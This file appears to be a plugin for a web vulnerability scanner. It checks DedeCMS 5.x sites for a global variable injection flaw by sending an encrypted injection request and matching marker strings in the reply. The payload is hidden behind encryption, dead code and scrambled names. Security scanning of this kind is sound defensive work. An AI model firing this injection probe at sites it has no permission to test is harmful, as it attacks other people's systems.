# -*- coding: utf-8 -*-
import binascii,re
import fcntl

from decode import Decoder
de_key = 'dd9108e2cb4dce78981dc247e24bd0df5c4b004058ebf271788a8e792d85a026'
decode = Decoder(binascii.a2b_hex(de_key)).decode
from dummy import *
from miniCurl import Curl
curl = Curl()
 #Embedded file name: dedecms_5.x_global_inj.py
if 0:
    i11iIiiIii

def assign(service, arg):
    if service == '''dedecms''':
        return (True, arg)
        if 0:
            O0 / iIii1I11I1II1 % OoooooooOO - i1IIi


def audit(arg):
    o0OO00 = arg
    oo, i1iII1IiiIiI1, iIiiiI1IiI1I1, o0OoOoOO00, o0OoOoOO00 = curl.curl(o0OO00 + decode('\x91\xdaU\x9e\xf0\x04\xb5\x05\xf3V\xb9\x1f\xab`\x9c\x95\x10tX,4\x97\xee\x07/\x95\x92e1\xac\xf8J\xb1\xed\x14\x94\x9cR\xd2d\xb44\x9a+\x8e7\xcc\xa9\x0bT\x1cLD\xc2\xaa\x1d\x14\xf6\x92\x0fz\x9a\xbc:\xd1\xb8P\x8e\xa71\xe2\x0e\xcf\x02\xdfK\xcb\x11\x99\xc0Gg\x0c\\d'))
    if i1iII1IiiIiI1 and iIiiiI1IiI1I1:
        I11i = util.decode_html(i1iII1IiiIiI1, iIiiiI1IiI1I1)
        if I11i and I11i.find(decode('4\x03\xa7+E\xde\x17\xfa\x14\xf4P\xc78\xccP\x15\xf5\xdb\xf9\xe6\xd9!m\xca\xb14#\xb3\xb0\x04I\x88Y')) != -1 and I11i.find(decode('\xe4\xfbP\x8f\x931\xb6\x14\xc2Q\x8fi\xdcr')) != -1:
            security_hole(o0OO00)
            if 0:
                OOooo000oo0.i1 * ii1IiI1i % IIIiiIIii


if __name__ == '__main__':
    from dummy import *

#KEY---dd9108e2cb4dce78981dc247e24bd0df5c4b004058ebf271788a8e792d85a026---